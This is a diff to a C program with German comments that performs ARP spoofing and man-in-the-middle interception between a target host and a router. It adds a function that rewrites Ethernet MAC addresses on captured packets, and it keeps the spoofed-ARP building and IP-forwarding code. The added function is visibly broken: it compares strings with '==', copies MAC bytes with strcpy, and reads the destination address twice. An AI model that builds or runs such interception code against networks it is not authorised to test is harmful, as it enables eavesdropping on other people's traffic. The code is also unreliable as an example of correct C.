@@ -7,6 +7,7 @@
 #include <string.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
+#include <netinet/ip.h>
 #include <net/ethernet.h>
 #include <sys/ioctl.h>
 #include <arpa/inet.h>
@@ -84,6 +85,7 @@ int get_interface_info(const char* ifac_n, unsigned char *local_m_buffer, int *i
     printf("ioctl Socket geschlossen.\n");
     return 0;
 }
+
 void build_arp_package(struct arp_packet *arp_p, unsigned char *target_mac_bytes, unsigned char *local_mac, const char *spoof_ip_str, const char *target_ip_str){
 
     memcpy(arp_p->eth_header.h_dest, target_mac_bytes, ETH_ALEN);
@@ -172,6 +174,36 @@ int set_ip_forwarding(int enable) {
     return 0;
 }
 
+void mod_mitm_package(const u_char *packet_data, const char *router_ip, const char *target_ip, unsigned char *router_mac[ETH_ALEN], unsigned char *target_mac){
+    
+    #ifndef ETH_HLEN
+    #define ETH_HLEN 14
+    #endif
+   
+    char src_ip_string[INET_ADDRSTRLEN];
+    char dst_ip_string[INET_ADDRSTRLEN];
+   
+    // Pointer auf den IP-Header setzen (nach dem Ethernet-Header)
+    struct iphdr *ip_header = (struct iphdr *)(packet_data + ETH_HLEN);
+    struct ethhdr *eth_header = (struct ethhdr *)packet_data;
+    // inet_ntop konvertiert eine numerische IP-Adresse in eine String-Darstellung
+    inet_ntop(AF_INET, &(ip_header->daddr), src_ip_string, INET_ADDRSTRLEN);
+    inet_ntop(AF_INET, &(ip_header->daddr), dst_ip_string, INET_ADDRSTRLEN);
+
+    if(src_ip_string == target_ip && dst_ip_string == router_ip){
+        memset(eth_header->h_dest, 0, ETH_ALEN);
+        strcpy(eth_header->h_dest, target_mac);
+        memset(eth_header->h_source, 0, ETH_ALEN);
+        strcpy(eth_header->h_source, router_mac);
+    }else if(src_ip_string == router_ip && dst_ip_string == target_ip){
+        memset(eth_header->h_dest, 0, ETH_ALEN);
+        strcpy(eth_header->h_dest, router_mac);
+        memset(eth_header->h_source, 0, ETH_ALEN);
+        strcpy(eth_header->h_source, target_mac);
+    }
+    
+}
+
 // Diese funktion wird für jedes erfasste Paket aufgerufen.
 // Sie ist da um die eigentlichen Manipulationen, weiterleitungen, etc. zu vollbringen
 void package_handler(const u_char *user_data, struct pcap *handle, struct pcap_pkthdr *pkthdr, const u_char *packet_data){
@@ -181,7 +213,6 @@ void package_handler(const u_char *user_data, struct pcap *handle, struct pcap_p
     printf("%x:%x:%x:%x:%x:%x\n\n", packet_data[0], packet_data[1], packet_data[2], packet_data[3], packet_data[4], packet_data[5]);
     // source mac
     printf("%x:%x:%x:%x:%x:%x\n\n", packet_data[6], packet_data[7], packet_data[8], packet_data[9], packet_data[10], packet_data[11]);
-    pcap_inject(handle, packet_data, pkthdr->len);
 
 }
 
@@ -229,7 +260,7 @@ int main(int argc, char *argv[])
    
     printf("Capture Socket erstellt\n");
 
-    // Ipv4 forwarding sysctl auf 1 setzen
+    // Ipv4 forwarding sysctl auf 1 setzen wenn es weiter geleitet werden soll
     if(set_ip_forwarding(1) == -1){
         perror("ip_forward");
         close(raw_sockfd);
@@ -266,7 +297,7 @@ int main(int argc, char *argv[])
             printf("Error in package capture: %s\n", pcap_geterr(handle));
         }
  
-        sleep(2); 
+        sleep(1); 
 
     }
 
